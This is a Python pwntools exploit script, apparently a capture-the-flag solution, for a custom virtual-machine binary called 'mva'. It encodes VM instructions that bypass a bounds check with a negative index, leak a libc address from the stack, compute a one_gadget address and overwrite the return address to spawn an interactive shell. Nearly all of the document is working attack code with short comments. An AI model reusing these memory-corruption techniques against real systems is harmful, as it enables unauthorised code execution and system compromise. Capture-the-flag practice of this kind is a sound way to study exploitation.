from pwn import *

io = process('./mva')
Libc_libc_start_main = 0x23FC0
Libc_one_gadget = 0xE3B31

def get_command(code, op1, op2, op3):
	return p8(code) + p8(op1) + p8(op2) + p8(op3)

def movl(reg, value):
	return get_command(1, reg, value >> 8, value & 0xFF)

def add(dest, add1, add2):
	return get_command(2, dest, add1, add2)

def sub(dest, subee, suber):
	return get_command(3, dest, subee, suber)

def band(dest, and1, and2):
	return get_command(4, dest, and1, and2)

def bor(dest, or1, or2):
	return get_command(5, dest, or1, or2)

def sar(dest, off):
	return get_command(6, dest, off, 0)

def bxor(dest, xor1, xor2):
	return get_command(7, dest, xor1, xor2)

def push(reg, value):
	if reg == 0:
		return get_command(9, reg, 0, 0)
	else:
		return get_command(9, reg, value >> 8, value & 0xFF)

def pop(reg):
	return get_command(10, reg, 0, 0)

def imul(dest, imul1, imul2):
	return get_command(13, dest, imul1, imul2)

def mov(src, dest):
	return get_command(14, src, dest, 0)

def print_top():
	return get_command(15, 0, 0, 0)

# Step 1: get __libc_start_main + 243

payload = b''
payload += movl(0, 0x8000)
payload += mov(0, 0xF9)			# bypass the check by making it nagative

payload += movl(0, 0x010F)
payload += mov(0, 0xF6)
payload += pop(0)				# HIGH WORD of __libc_start_main
payload += pop(1)				# MIDDLE WORD of __libc_start_main
payload += pop(2)				# LOW WORD of __libc_start_main

payload += movl(3, 243)
payload += sub(2, 2, 3)			# this step may fail due to the ignorance of borrowed bit, but in 1/16 to fail
# __libc_start_main got

payload += movl(3, 0x3FC0)		# this step may also fail due to same reason, 1/4 to fail until now
payload += sub(2, 2, 3)
payload += movl(3, 0x2)
payload += sub(1, 1, 3)
# libc load address got

payload += movl(3, 0x3B31)
payload += add(2, 2, 3)
payload += movl(3, 0xE)
payload += add(1, 1, 3)
# one_gadget address got

payload += mov(0, 3)
payload += mov(2, 0)
payload += push(0, 0)
payload += mov(1, 0)
payload += push(0, 0)
payload += mov(3, 0)
payload += push(0, 0)
# inject one_gadget address to return_addr

payload = payload.ljust(0x100, b'\x00')
payload += b'\n'

for c in payload:
	print('%02x' % c, end=' ')

io.sendlineafter(b'[+] Welcome to MVA, input your code now :', payload)

io.interactive()